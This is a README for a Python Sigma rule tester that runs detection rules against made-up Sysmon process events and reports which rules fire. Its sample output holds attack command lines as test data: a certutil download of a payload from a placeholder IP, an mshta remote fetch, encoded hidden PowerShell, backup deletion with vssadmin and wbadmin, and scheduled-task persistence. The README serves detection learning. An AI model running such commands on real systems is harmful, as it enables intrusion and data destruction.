# Sigma Rule Tester

Python script that runs Sigma detection rules against a file of JSON log events and shows which rules fire. It also checks the rule files for missing fields. I made it because I wanted to understand how a Sigma rule really works, and to test a rule on sample logs before it goes to a SIEM.

## What it does
- Reads Sigma rules (.yml) from one file or a whole folder
- Reads events from a JSON lines file (I used Sysmon process creation events)
- Supports the common Sigma modifiers: `contains`, `startswith`, `endswith`, `re` and `all`
- Supports `*` and `?` wildcards, lists of values (OR) and keyword lists
- Supports conditions with `and`, `or`, `not`, brackets, `1 of selection_*`, `all of them`
- Shows hits per rule with the level, the MITRE ATT&CK ID and the first 3 matching events
- Lists the rules that matched nothing
- Checks each rule for problems: missing id, description or falsepositives, a wrong level, no ATT&CK tag, empty selection
- Skips rules it cannot run (aggregation like `count()`) and tells you why
- Exit code is 1 when a rule matched, `--json` gives JSON output
- Needs PyYAML to read the rule files

## How to run
```
git clone https://github.com/Satish-R01/Cybersecurity-Projects.git
cd Cybersecurity-Projects/25-Sigma-Rule-Tester
pip install -r requirements.txt

python3 sigma_tester.py samples/rules samples/events.jsonl
python3 sigma_tester.py samples/rules samples/events.jsonl -l high
python3 sigma_tester.py samples/rules/proc_certutil_download.yml samples/events.jsonl --json
```

Options:
- `-l` only run rules at this level or higher (informational, low, medium, high, critical)
- `--no-lint` do not check the rule files
- `--json` print the result as JSON

## Output on the sample data
```
$ python3 sigma_tester.py samples/rules samples/events.jsonl
[*] 7 rules, 88 events
[!] 6 rule(s) matched, 11 alerts in total

LEVEL     HITS  RULE                                         ATT&CK
--------------------------------------------------------------------------------
CRITICAL  2     Shadow Copies Deleted                        T1490
    event 76   SRV-FILE-01  vssadmin delete shadows /all /quiet
    event 79   SRV-FILE-01  wbadmin delete catalog -quiet
HIGH      2     Encoded PowerShell Command                   T1059.001
    event 57   WS-HR-01     powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==
    event 70   WS-FIN-02    powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQ== 
HIGH      2     Office App Starts Command Shell              T1204.002
    event 53   WS-HR-01     cmd.exe /c powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==
    event 74   WS-FIN-02    mshta.exe http://203.0.113.50/a.hta
MEDIUM    1     Certutil Used To Download A File             T1105
    event 59   WS-HR-01     certutil.exe -urlcache -split -f http://203.0.113.50/payload.bin C:\Users\priya\AppData\Local\Temp\p.exe
MEDIUM    1     Scheduled Task Created From User Folder      T1053.005
    event 61   WS-HR-01     schtasks /create /tn Updater /tr C:\Users\priya\AppData\Local\Temp\p.exe /sc minute /mo 30
LOW       3     Account And Domain Discovery Commands        T1087.002, T1482
    event 65   WS-HR-01     net group "domain admins" /domain
    event 67   WS-HR-01     nltest /dclist:corp.local
    event 85   WS-DEV-03    net localgroup administrators /domain

Rules with no matches: Suspicious Mimikatz Name

Rule problems:
  bad_rule_example.yml: level 'severe' is not valid; no MITRE ATT&CK technique tag; no falsepositives listed; selection 'empty_one' is empty
[-] skipped unsupported_count_rule.yml: aggregation conditions (count, near) are not supported
```

The events are made up. There are 88 process creation events on 5 hosts, and most of them are normal work (Chrome, Office, ipconfig, VS Code). I hid an attack chain in them:
- WS-HR-01: Word starts cmd, which runs encoded PowerShell, then certutil downloads a file, then a scheduled task is made for it and the domain is checked
- WS-FIN-02: Excel starts mshta and PowerShell runs an encoded command
- SRV-FILE-01: vssadmin and wbadmin delete the backups. A scheduled task from `C:\Users\Public` is also there, but it runs as SYSTEM, so the `filter_admin` part of the rule leaves it out. I added it to test the `not` condition
- `bad_rule_example.yml` has problems on purpose and `unsupported_count_rule.yml` uses `count()`, so the tester skips it

The rule folder has 7 normal rules, but only 6 fire. The Mimikatz rule has no match, which is expected for this data.

## What I'd do as L1 after an alert
- Read the matching event: host, user, parent process and full command line
- Check other events on the same host in the same few minutes (the rules fire one by one, but together they show the attack chain)
- Decode any Base64 command to see what it does
- Check the download address on VirusTotal and the threat feeds
- If the chain looks real, isolate the host and escalate to L2
- If the rule is noisy, note the false positive so the rule can get a filter

MITRE ATT&CK used in the sample rules: T1059.001, T1204.002, T1105, T1490, T1053.005, T1087.002, T1482.

To prevent it: block Office from starting child processes (ASR rules), use PowerShell Constrained Language Mode and log script blocks.

## Limitations
- Only Sigma rules for one event at a time. It does not run `count()`, `near` or time based rules
- It does not convert the rules for Splunk, Elastic or Sentinel. That is what sigma-cli is for
- Field names must match the log. Sigma has a field mapping per log source and I did not add that
- The `windash`, `base64` and `cidr` modifiers are not supported
- It is a learning tool, so real rules should be tested in the real SIEM too

## Tests
```
pip install pytest
python3 -m pytest tests
```

Satish R - https://www.linkedin.com/in/cybersatish
